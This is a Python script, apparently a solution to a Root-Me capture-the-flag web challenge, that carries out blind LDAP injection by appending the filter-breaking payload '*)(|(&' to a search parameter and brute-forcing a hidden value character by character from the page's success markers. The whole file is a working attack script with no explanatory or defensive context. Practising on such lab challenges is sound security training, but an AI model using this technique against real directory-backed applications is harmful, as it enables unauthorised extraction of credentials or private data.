import requests
from bs4 import BeautifulSoup
import string

url = 'http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search='


char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

successful_response_found = True
successful_chars = ''

while successful_response_found:
    successful_response_found = False

    for char in char_set:
     
        search_query = f'{successful_chars}{char}*)(|(&'
        response = requests.get(url + search_query)

        soup = BeautifulSoup(response.content, 'html.parser')
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")
